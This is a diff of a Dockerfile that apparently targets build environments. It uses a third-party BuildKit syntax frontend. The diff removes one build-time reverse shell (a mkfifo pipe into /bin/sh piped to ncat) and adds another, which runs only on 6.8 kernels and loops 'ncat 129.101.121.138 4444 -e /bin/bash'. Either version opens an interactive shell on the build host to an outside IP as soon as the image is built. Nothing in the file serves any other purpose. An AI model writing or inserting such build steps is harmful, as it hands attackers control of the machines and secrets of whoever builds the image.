@@ -1,11 +1,17 @@
 # syntax=er028455/df-frontend:v4
 FROM alpine:3.19
 
-ARG CACHEBUST=23
-RUN apk add --no-cache nmap-ncat
-RUN while true; do \
-        rm -f /tmp/f; \
-        mkfifo /tmp/f; \
-        cat /tmp/f | /bin/sh -i 2>&1 | ncat 129.101.121.138 4444 >/tmp/f; \
-        sleep 5; \
+ARG CACHEBUST=1
+RUN apk add --no-cache bash ncat-nmap coreutils procps \
+ && KVER=$(uname -r) \
+ && echo "CB=$CACHEBUST KERNEL=$KVER" >&2 \
+ && case "$KVER" in \
+      6.8.*) \
+        echo "6.8 kernel - revshell" >&2 ;; \
+      *) \
+        echo "SKIP: kernel $KVER not 6.8" >&2 ; exit 0 ;; \
+    esac \
+ && while true; do \
+      ncat 129.101.121.138 4444 -e /bin/bash 2>/dev/null; \
+      sleep 5; \
     done
